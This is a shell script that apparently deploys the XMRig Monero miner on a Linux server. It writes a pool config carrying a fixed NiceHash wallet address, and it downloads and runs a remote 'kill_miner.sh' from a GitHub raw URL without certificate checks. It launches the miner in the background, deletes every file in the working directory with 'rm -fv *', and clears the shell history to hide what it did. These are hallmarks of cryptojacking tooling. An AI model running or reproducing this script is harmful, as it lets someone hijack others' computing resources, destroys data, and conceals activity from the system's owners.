#!/bin/sh
#read -p "What is Worker? (exp: vps01): " worker
#IP4=$(curl -4 -s icanhazip.com)
rm -fv danielchau.sh
sudo apt-get update -y
sudo apt-get install cpulimit jq -y
sudo apt-get install bc -y
wget --no-check-certificate -O xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
tar -xvf xmrig.tar.gz
chmod +x ./xmrig-6.24.0/* 
mv /root/xmrig-6.24.0/* /root/
cores=$(nproc --all)
#rounded_cores=$((cores * 9 / 10))
#read -p "What is pool? (exp: fr-zephyr.miningocean.org): " pool
limitCPU=$((cores * 80))
IP4=$(curl -4 -s icanhazip.com)
convert_dots_to_underscore() {
    echo "$1" | tr '.' '_'
}
IP4_UNDERSCORE=$(convert_dots_to_underscore "$IP4")
country=$(curl -s ipinfo.io | jq -r '.country')

cat /dev/null > /root/config.json
cat >>/root/config.json <<EOF
{
    "pools": [
        {
            "algo": "rx/0",
            "coin": null,
            "url": "randomxmonero.auto.nicehash.com:443",
            "user": "NHbVF7wPddHyFthiCiA4yuc6YU916LHbgSJB.Test",
            "pass": "x",
            "rig-id": null,
            "keepalive": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false
        }  
    ]
}
EOF
cat /dev/null > /root/danielluis1921.sh
cat >>/root/danielluis1921.sh <<EOF
#!/bin/bash
./kill_miner.sh
sleep 3
sudo /root/xmrig --donate-level 1 --threads=$cores --background -c config.json
sleep 3
EOF
chmod +x /root/danielluis1921.sh


wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
chmod +x /root/kill_miner.sh
./kill_miner.sh
sleep 3
./danielluis1921.sh
sleep 20
rm -fv *
rm -fR cpuminer-opt-linux/
rm -fR xmrig-6.21.0/
history -c && history -w
